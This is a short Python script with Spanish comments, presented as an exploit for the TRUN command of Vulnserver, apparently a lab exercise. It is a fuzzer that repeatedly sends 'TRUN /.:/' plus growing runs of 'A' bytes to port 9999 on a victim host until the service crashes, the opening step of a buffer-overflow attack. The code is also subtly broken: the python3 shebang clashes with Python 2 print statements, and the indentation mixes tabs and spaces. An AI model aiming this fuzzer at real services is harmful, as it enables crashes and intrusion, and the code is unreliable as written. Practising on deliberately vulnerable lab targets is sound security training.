#!/usr/bin/env python3

#  Exploit para VULNSERSER parametro TRUN por German Flores

import socket
import struct
from time import sleep

RHOST='win7'  # Aqui va la IP de la victima
RPORT=9999                      


offset=0  #2002
 
while True:
        startpoint=0
	step=100
	try:
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(2)
		s.connect((RHOST,RPORT))
		offset+=step
		data = s.recv(1024)
		buffer=b"TRUN /.:/ "+ b"A"*offset
		print "[+] Enviando ",offset," bytes"
		s.send(buffer)
		#data = s.recv(1024)
		s.close()
		sleep(1)
	except Exception as e:
		#print(e)
		print "El fuzzer se detuvo al enviar ",offset, "bytes"
		break;




